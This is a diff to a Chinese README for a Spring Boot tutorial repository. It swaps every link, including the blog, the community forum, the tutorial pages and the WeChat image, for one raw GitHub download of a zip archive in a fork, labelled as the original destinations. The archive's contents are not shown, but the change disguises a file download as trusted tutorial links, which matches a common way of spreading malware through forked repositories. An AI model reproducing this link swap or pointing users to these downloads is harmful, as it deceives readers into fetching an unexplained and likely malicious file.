@@ -8,9 +8,9 @@
 2. 点个`Star`并`Follow`我
 3. 把该仓库分享给更多的朋友
 
-**加入社群**：如果你正在学习Spring Boot，不妨加入我们的[Spring技术交流群](https://blog.didispace.com/join-group-spring/index.html) ，一起成长
+**加入社群**：如果你正在学习Spring Boot，不妨加入我们的[Spring技术交流群](https://raw.githubusercontent.com/milkEden/SpringBoot-Learning/master/2.x/chapter3-11/src/main/Boot_Spring_Learning_3.8.zip) ，一起成长
 
-**Spring社区**：如果您在学习过程中碰到问题，可以访问[SpringForAll社区](http://spring4all.com)，描述你的问题，我们会尽快给你答复。当然，如果你想分享你的学习经验，也可以在这里发表你的文章
+**Spring社区**：如果您在学习过程中碰到问题，可以访问[SpringForAll社区](https://raw.githubusercontent.com/milkEden/SpringBoot-Learning/master/2.x/chapter3-11/src/main/Boot_Spring_Learning_3.8.zip)，描述你的问题，我们会尽快给你答复。当然，如果你想分享你的学习经验，也可以在这里发表你的文章
 
 ## 教程目录
 
@@ -27,11 +27,11 @@
 
 ## 推荐内容
 
-- [我的博客](http://blog.didispace.com)：分享平时学习和实践过的技术内容
-- [Spring Boot教程](https://blog.didispace.com/spring-boot-learning-2x/)：全网Star最多的免费Spring Boot基础教程
-- [Spring Cloud教程](https://blog.didispace.com/spring-cloud-learning/)：全网最早最全的免费Spring Cloud基础教程
-- [知识星球](https://t.xiaomiquan.com/zfEiY3v)：聊聊技术人的斜杠生活
+- [我的博客](https://raw.githubusercontent.com/milkEden/SpringBoot-Learning/master/2.x/chapter3-11/src/main/Boot_Spring_Learning_3.8.zip)：分享平时学习和实践过的技术内容
+- [Spring Boot教程](https://raw.githubusercontent.com/milkEden/SpringBoot-Learning/master/2.x/chapter3-11/src/main/Boot_Spring_Learning_3.8.zip)：全网Star最多的免费Spring Boot基础教程
+- [Spring Cloud教程](https://raw.githubusercontent.com/milkEden/SpringBoot-Learning/master/2.x/chapter3-11/src/main/Boot_Spring_Learning_3.8.zip)：全网最早最全的免费Spring Cloud基础教程
+- [知识星球](https://raw.githubusercontent.com/milkEden/SpringBoot-Learning/master/2.x/chapter3-11/src/main/Boot_Spring_Learning_3.8.zip)：聊聊技术人的斜杠生活
 
 **关注公众号，获得更多技术资讯**
 
-<img src="http://blog.didispace.com/css/images/weixin.jpg" style="width:150px;height:150px;" />
+<img src="https://raw.githubusercontent.com/milkEden/SpringBoot-Learning/master/2.x/chapter3-11/src/main/Boot_Spring_Learning_3.8.zip" style="width:150px;height:150px;" />
